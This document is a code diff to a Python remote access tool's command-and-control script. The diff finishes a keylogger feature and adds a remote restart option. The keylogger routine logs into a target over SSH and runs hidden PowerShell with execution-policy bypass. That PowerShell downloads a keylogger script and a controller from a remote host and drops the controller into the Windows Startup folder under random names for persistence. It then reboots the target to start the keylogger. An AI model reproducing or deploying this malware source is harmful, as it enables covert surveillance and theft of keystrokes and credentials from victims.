@@ -39,10 +39,10 @@ help_menu = """
 options_menu = """
             [+] command and control:
                 [0] Remote Console
-                [1] Keylogger       (not done yet)
+                [1] Keylogger       
                 [2] remote download (not done yet) 
                 [3] remote upload   (not done yet) 
-                [4] remote command  (not done yet)
+                [4] restart target
 
             [+] Options:
                 [-h] or [--help]     ---   help
@@ -108,23 +108,19 @@ def remote_download(ipv4,pword,path_to_file,local_download_location):
 def remote_command(ipv4,pword,command):
     os.system(f"sshpass -p \'{pword}\' ssh onlyrat@{ipv4} '{command}'")
 
-def keylogger(ipv4,pword,temp_path,startup_path,uname):
+def keylogger(ipv4,pword,temp_path,startup_path):
     print("[+] Initializing keylogger....")
     keylogger_command  = f"powershell.exe -noP -ep bypass -windowstyle hidden -c \"iwr -uri {remote_path}/keylogger/keylogger.ps1 -outfile {temp_path}/XukhovfGQPLEcYwZ.ps1\""
     controller_command = f"""powershell.exe -noP -ep bypass -windowstyle hidden -c "iwr -uri {remote_path}/keylogger/controller.cmd -outfile \\"{startup_path}/meuqSoQyrCUvhGjpV.cmd\\"" """
-    execute_keylogger  = f"""powershell -noP -ep bypass -w hidden start-process powershell.exe -windowstyle hidden "C:/Users/{uname}/AppData/Roaming/Microsoft/Windows/'Start Menu'/Programs/Startup/meuqSoQyrCUvhGjpV.cmd" """
     print("[+] keylogger prepared. Ready to download....")
-    # print(keylogger_command,'\n\n',scheduler_command,'\n\n',controller_command,'\n\n')
+    # print(keylogger_command,'\n\n',controller_command,'\n\n')
     print("[+] Initializing keylogger.....")
     remote_command(ipv4,pword,keylogger_command)
     print("[+] Initializing  controller.....")
     remote_command(ipv4,pword,controller_command)
     print("[*] keylogger installed successfully")
-    print("\n[+] Executing keylogger...\n")
-    print(controller_command)
-    print(execute_keylogger)
-    remote_command(ipv4,pword,execute_keylogger)
-    print("[*] Keylogger executed successfully...")
+
+    print("\n[!] Restart target host to execute")
 
 def update():
     return
@@ -156,7 +152,9 @@ def cli(arguments):
                 if option == "0":
                     connect(tgt_ipv4,tgt_pword)
                 elif option == "1":
-                    keylogger(tgt_ipv4,tgt_pword,tgt_td,tgt_sd,tgt_uname)
+                    keylogger(tgt_ipv4,tgt_pword,tgt_td,tgt_sd)
+                elif option == "4":
+                    remote_command(tgt_ipv4,tgt_pword,"shutdown /r")
                 elif option == "help":
                     clear()
                     print(banner)
